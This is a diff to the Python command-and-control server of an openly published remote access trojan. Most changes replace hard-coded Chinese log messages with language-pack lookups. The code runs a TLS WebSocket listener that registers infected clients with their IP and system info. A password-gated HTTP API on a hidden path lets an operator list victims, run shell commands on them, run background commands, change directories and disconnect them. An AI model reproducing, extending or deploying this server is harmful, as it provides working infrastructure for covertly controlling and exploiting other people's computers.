@@ -1,14 +1,16 @@
 __author__ = "赵博凯"
 __license__ = "GPL v3"
 
-from quart import Quart, redirect, url_for, request, make_response, render_template, jsonify, websocket
+from quart import Quart, request, jsonify, websocket
+from sys import exit
+
+import load_lang_pack
+
 import asyncio
 import websockets
 import hashlib
 import ssl
 import rich
-import json
-from sys import exit
 import logging
 
 import rich.traceback 
@@ -25,34 +27,31 @@ HOST = '0.0.0.0'
 PORT = 8765
 WEB_HOST = '0.0.0.0'
 WEB_PORT = 5000
-SSL_CERT = '../cert.pem' 
-SSL_KEY = '../key.pem'
+SSL_CERT = 'cert.pem' 
+SSL_KEY = 'key.pem'
 SECURITY_PATH = 'fuck'
 SECURITY_PASSWORD_HASH = '6ac3c336e4094835293a3fed8a4b5fedde1b5e2626d9838fed50693bba00af0e' 
 
 # 全局变量
 app = Quart(__name__)
 control_list = {}
+lp = load_lang_pack.LanguagePack("server_api.json", "en")
+lp.load()
 
 # 服务器核心类
 class Server:
     def __init__(self):
-        logging.info("服务器初始化")
+        logging.info(lp.get("server_init"))
 
     def about(self):
-        logging.info("获取关于信息")
-        about_text = '''关于：
-作者：赵博凯
-版权：Copyright © 赵博凯, All Rights Reserved.
-此为开源软件，链接：[link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
-使用GPL v3协议，请自觉遵守协议。'''
-        return about_text
+        logging.info(lp.get("about"))
+        return lp.get("about")
     
     def client_list(self):
-        logging.info("获取客户端列表")
+        logging.info(lp.get("getting_client_list"))
         if len(control_list) == 0:
-            logging.info("当前无连接设备")
-            return "当前没有设备连接。"
+            logging.info(lp.get("no_connected_devices"))
+            return lp.get("no_devices_connected")
         else:
             devices = []
             for device in control_list.items():
@@ -61,94 +60,94 @@ class Server:
                     'ip': device[1]['ip'],
                     'systeminfo': device[1]['systeminfo']
                 })
-            logging.info(f"设备列表：{devices}")
+            logging.info(f"{lp.get('device_list')}：{devices}")
             return devices
     
     async def delete(self, id):
-        logging.info(f"删除设备：{id}")
+        logging.info(f"{lp.get('deleting_device')}：{id}")
         global control_list
         if id in control_list:
             websocket_ = control_list[id]['websocket']
             try:
                 await websocket_.send("exit")
                 control_list.pop(id)
-                logging.info(f"设备 {id} 删除成功")
-                return f"成功删除ID为{id}的设备。"
+                logging.info(f"{lp.get('device_deleted_successfully')} {id}")
+                return f"{lp.get('successfully_deleted_device')}{id}。"
             except Exception as e:
                 control_list.pop(id)
-                logging.error(f"删除设备 {id} 失败：{str(e)}")
-                return f"断开设备ID为{id}的连接时发生异常: {e}"
+                logging.error(f"{lp.get('failed_to_delete_device')} {id}：{str(e)}")
+                return f"{lp.get('exception_occurred_while_disconnecting')}{id}：{e}"
         else:
-            logging.error(f"设备 {id} 不存在")
-            return f"设备ID为{id}的设备不存在。"
+            logging.error(f"{lp.get('device_does_not_exist')} {id}")
+            return f"{lp.get('device_with_id_does_not_exist')}{id}。"
 
 # 客户端控制类
 class ControlClient:
     def __init__(self, id):
-        logging.info(f"初始化客户端控制器：{id}")
+        logging.info(f"{lp.get('initializing_client_controller')}：{id}")
         self.id = id
         self.websocket = control_list[id]['websocket']
     
     async def system_info(self):
-        logging.info(f"获取设备的系统信息")
+        logging.info(lp.get("getting_device_system_information"))
         try:
             await self.websocket.send("systeminfo")
             result = await self.websocket.recv()
-            logging.info(f"系统信息：{result}")
+            logging.info(f"{lp.get('system_information')}：{result}")
             return result
         except Exception as e:
-            logging.error(f"获取系统信息失败：{str(e)}")
+            logging.error(f"{lp.get('failed_to_get_system_information')}：{str(e)}")
             raise
     
     async def execute_command(self, command):
-        logging.info(f"执行命令：{command}")
+        logging.info(f"{lp.get('executing_command')}：{command}")
         try:
             await self.websocket.send(f"command:{command}")
             result = await self.websocket.recv()
-            logging.info(f"命令结果：{result}")
+            logging.info(f"{lp.get('command_result')}：{result}")
             return result
         except Exception as e:
-            logging.error(f"命令执行失败：{str(e)}")
+            logging.error(f"{lp.get('command_execution_failed')}：{str(e)}")
             raise
 
     async def background(self, command):
-        logging.info(f"后台执行命令：{command}")
+        logging.info(f"{lp.get('executing_command_in_background')}：{command}")
         try:
             await self.websocket.send(f"background:{command}")
             await self.websocket.recv()
-            logging.info("后台命令发送成功")
-            return "命令已发送"
+            logging.info(lp.get("background_command_sent_successfully"))
+            return lp.get("command_sent")
         except Exception as e:
-            logging.error(f"后台命令执行失败：{str(e)}")
+            logging.error(f"{lp.get('background_command_execution_failed')}：{str(e)}")
             raise
 
     async def change_directory(self, directory):
-        logging.info(f"切换目录：{directory}")
+        logging.info(f"{lp.get('changing_directory')}：{directory}")
         try:
             await self.websocket.send(f"change_directory:{directory}")
             result = await self.websocket.recv()
-            logging.info(f"目录切换结果：{result}")
+            logging.info(f"{lp.get('directory_change_result')}：{result}")
             return result
         except Exception as e:
-            logging.error(f"目录切换失败：{str(e)}")
+            logging.error(f"{lp.get('directory_change_failed')}：{str(e)}")
             raise
 
 # 安全验证函数
 def check():
-    logging.info("执行安全验证")
-    logging.debug(f"请求cookies：{request.cookies}")
+    logging.info(lp.get("performing_security_verification"))
+    logging.debug(f"{lp.get('request_cookies')}：{request.cookies}")
     if "Cookie" not in request.cookies:
-        logging.warning("未找到Cookie")
+        logging.warning(lp.get("cookie_not_found"))
         return False
     if request.cookies.get('Cookie') == hashlib.sha256(SECURITY_PASSWORD_HASH.encode()).hexdigest():
-        logging.info("验证通过")
+        logging.info(lp.get("verification_passed"))
         return True
     else:
-        logging.warning("验证失败")
+        logging.warning(lp.get("verification_failed"))
         return False
 
 # 禁止所有爬虫爬取所有页面
-@app.route("robots.txt")
+@app.route("/robots.txt")
 async def robots():
     return '''User-Agent: *
     Disallow: /
@@ -157,64 +156,68 @@ async def robots():
 # 密码验证路由
 @app.route(f"/{SECURITY_PATH}/verify", methods=['POST'])
 async def verify():
-    logging.info("收到密码验证请求")
+    logging.info(lp.get("received_password_verification_request"))
     try:
         json_data = await request.get_json()
         if "password" not in json_data:
-            logging.warning("未提供密码")
-            return jsonify({'error': '未提供密码'}), 400
+            logging.warning(lp.get("password_not_provided"))
+            return jsonify({'error': lp.get('password_not_provided')}), 400
         
         password = json_data["password"]
         if hashlib.sha256(password.encode()).hexdigest() == SECURITY_PASSWORD_HASH:
-            logging.info("密码验证成功")
+            logging.info(lp.get("password_verification_successful"))
             cookie = hashlib.sha256(SECURITY_PASSWORD_HASH.encode()).hexdigest()
             return jsonify({'Cookie': cookie})
         else:
-            logging.warning("密码错误")
-            return jsonify({'error': '密码错误'}), 401
+            logging.warning(lp.get("incorrect_password"))
+            return jsonify({'error': lp.get('incorrect_password')}), 401
     except Exception as e:
-        logging.error(f"验证过程错误：{str(e)}")
-        return jsonify({'error': '服务器错误'}), 500
+        logging.error(f"{lp.get('verification_process_error')}：{str(e)}")
+        return jsonify({'error': lp.get('server_error')}), 500
 
 # API功能路由
 @app.route(f"/{SECURITY_PATH}/function", methods=['POST'])
 async def function():
-    logging.info("收到功能请求")
+    logging.info(lp.get("received_function_request"))
     try:
         if not check():
-            logging.warning("未授权请求")
-            return jsonify({'error': '未授权'}), 401
+            logging.warning(lp.get("unauthorized_request"))
+            return jsonify({'error': lp.get('unauthorized_request')}), 401
 
         json_data = await request.get_json()
-        logging.debug(f"请求数据：{json_data}")
+        logging.debug(f"{lp.get('request_data')}：{json_data}")
         
         if json_data is None or "func_name" not in json_data:
-            logging.warning("未提供函数名")
-            return jsonify({'error': '未提供函数名'}), 400
+            logging.warning(lp.get("function_name_not_provided"))
+            return jsonify({'error': lp.get('function_name_not_provided')}), 400
 
         func_name = json_data["func_name"]
-        logging.info(f"请求功能：{func_name}")
+        logging.info(f"{lp.get('requested_function')}：{func_name}")
 
         valid_functions = ["device_list", "delete", "systeminfo", "command", "background", "change_directory"]
         if func_name not in valid_functions:
-            logging.warning(f"无效功能：{func_name}")
-            return jsonify({'error': '未提供有效的函数名'}), 400
+            logging.warning(f"{lp.get('invalid_function')}：{func_name}")
+            return jsonify({'error': lp.get('invalid_function_name_provided')}), 400
 
         server = Server()
 
         if func_name == "device_list":
             return jsonify(server.client_list())
-        
+
         if "id" not in json_data:
-            logging.warning("未提供设备ID")
-            return jsonify({'error': '未提供设备ID'}), 400
+            logging.warning(lp.get("device_id_not_provided"))
+            return jsonify({'error': lp.get('device_id_not_provided')}), 400
         
         device_id = json_data["id"]
-        logging.info(f"目标设备：{device_id}")
+        logging.info(f"{lp.get('target_device')}：{device_id}")
         
-        if not any(device_id in device.values() for device in server.client_list()):
-            logging.warning(f"设备不存在：{device_id}")
-            return jsonify({'error': '设备ID不存在'}), 400
+        client_list = server.client_list()
+        if "没有" in client_list:
+            logging.warning(f"{lp.get('device_does_not_exist')}：{device_id}")
+            return jsonify({'error': f"{lp.get('device_with_id_does_not_exist')}{device_id}"}), 400
+        if not any(device_id in device.values() for device in client_list):
+            logging.warning(f"{lp.get('device_does_not_exist')}：{device_id}")
+            return jsonify({'error': f"{lp.get('device_with_id_does_not_exist')}{device_id}"}), 400
         
         if func_name == "delete":
             return jsonify({"message": await server.delete(device_id)})
@@ -226,8 +229,8 @@ async def function():
 
         if func_name in ["command", "background"]:
             if "command" not in json_data:
-                logging.warning("未提供命令")
-                return jsonify({'error': '未提供命令'}), 400
+                logging.warning(lp.get("command_not_provided"))
+                return jsonify({'error': lp.get('command_not_provided')}), 400
             
             command = json_data["command"]
             if func_name == "command":
@@ -237,26 +240,26 @@ async def function():
         
         if func_name == "change_directory":
             if "directory" not in json_data:
-                logging.warning("未提供目录")
-                return jsonify({'error': '未提供目录'}), 400
+                logging.warning(lp.get("directory_not_provided"))
+                return jsonify({'error': lp.get('directory_not_provided')}), 400
             
             directory = json_data["directory"]
             return jsonify({"message": await control_client.change_directory(directory)})
     
     except Exception as e:
-        logging.error(f"请求处理错误：{str(e)}")
+        logging.error(f"{lp.get('request_processing_error')}：{str(e)}")
         return jsonify({'error': str(e)}), 500
 
 # WebSocket客户端处理
 async def handle_client(websocket):
     ip = websocket.remote_address[0] + ":" + str(websocket.remote_address[1])
-    logging.info(f"新客户端连接：{ip}")
+    logging.info(f"{lp.get('new_client_connected')}：{ip}")
     
     try:
         systeminfo = await websocket.recv()
-        logging.info(f"客户端系统信息：{systeminfo}")
+        logging.info(f"{lp.get('client_system_information')}：{systeminfo}")
     except Exception as e:
-        logging.error(f"获取系统信息失败：{str(e)}")
+        logging.error(f"{lp.get('failed_to_get_system_info')}：{str(e)}")
         systeminfo = "ERROR"
     
     control_list[str(websocket.id)] = {
@@ -265,48 +268,48 @@ async def handle_client(websocket):
         "systeminfo": systeminfo
     }
     
-    logging.info(f"客户端 {ip} 连接成功，ID：{websocket.id}")
+    logging.info(f"{lp.get('client_connected_successfully')} {ip}，ID：{websocket.id}")
     try:
         await websocket.wait_closed()
     except Exception as e:
-        logging.error(f"连接异常：{str(e)}")
+        logging.error(f"{lp.get('connection_exception')}：{str(e)}")
     finally:
         if str(websocket.id) in control_list:
             del control_list[str(websocket.id)]
-            logging.info(f"客户端 {ip} 断开连接")
+            logging.info(f"{lp.get('client_disconnected')} {ip}")
 
 # 服务器主循环
 async def server_loop():
-    logging.info("初始化服务器")
-    logging.info(f"证书路径：{SSL_CERT}，密钥路径：{SSL_KEY}")
+    logging.info(lp.get("initializing_server"))
+    logging.info(f"{lp.get('certificate_path')}：{SSL_CERT}，{lp.get('key_path')}：{SSL_KEY}")
     
     try:
         ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
-        logging.info("SSL证书加载成功")
+        logging.info(lp.get("ssl_certificate_loaded_successfully"))
     except FileNotFoundError:
-        logging.error("证书文件不存在")
+        logging.error(lp.get("certificate_file_not_found"))
         exit(1)
     except Exception as e:
-        logging.error(f"SSL加载失败：{str(e)}")
+        logging.error(f"{lp.get('ssl_loading_failed')}：{str(e)}")
         exit(1)
 
-    logging.info(f"启动服务器：{HOST}:{PORT}")
+    logging.info(f"{lp.get('starting_server')}：{HOST}:{PORT}")
     try:
         async with websockets.serve(handle_client, HOST, PORT, ssl=ssl_context):
-            logging.info("服务器启动成功")
+            logging.info(lp.get("server_started_successfully"))
             try:
                 quit_event = asyncio.Event()
                 await quit_event.wait()
             except KeyboardInterrupt:
-                logging.warning("服务器被用户中断")
+                logging.warning(lp.get("server_interrupted_by_user"))
     except Exception as e:
-        logging.error(f"服务器启动失败：{str(e)}")
+        logging.error(f"{lp.get('server_startup_failed')}：{str(e)}")
         exit(1)
 
 # 主程序入口
 async def main():
-    logging.info("程序启动")
+    logging.info(lp.get("program_starting"))
     try:
         # 创建任务
         server_task = asyncio.create_task(server_loop())
@@ -320,18 +323,18 @@ async def main():
         for task in tasks:
             task.cancel()
     except Exception as e:
-        logging.error(f"程序错误：{str(e)}")
+        logging.error(f"{lp.get('program_error')}：{str(e)}")
         exit(1)
 
 if __name__ == '__main__':
     try:
         print("\033[H\033[J")
-        logging.info("版权所有：Copyright © 赵博凯, All Rights Reserved.")
+        logging.info(lp.get("copyright"))
         asyncio.run(main())
     except KeyboardInterrupt:
-        logging.warning("程序被用户中断")
+        logging.warning(lp.get("program_interrupted_by_user"))
         exit(0)
     except Exception as e:
-        logging.critical(f"致命错误：{str(e)}")
-        logging.error("请报告到[link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]")
+        logging.critical(f"{lp.get('fatal_error')}：{str(e)}")
+        logging.error(lp.get("please_report_to_issues"))
         exit(1)
